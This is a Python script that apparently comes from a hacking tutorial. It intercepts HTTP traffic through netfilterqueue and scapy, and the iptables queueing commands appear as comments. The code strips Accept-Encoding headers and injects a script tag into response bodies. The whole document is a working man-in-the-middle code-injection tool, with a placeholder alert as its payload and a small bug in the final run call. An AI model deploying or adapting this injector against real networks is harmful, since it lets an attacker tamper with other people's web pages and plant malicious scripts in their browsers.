#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

# iptables -I INPUT -j NFQUEUE ---queue-num 0
# iptables -I OUTPUT -j NFQUEUE ---queue-num 0

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            #print(packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            load = load.replace("</body>", "<script>alert('test');</script>")
            #print(packet.show())

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run

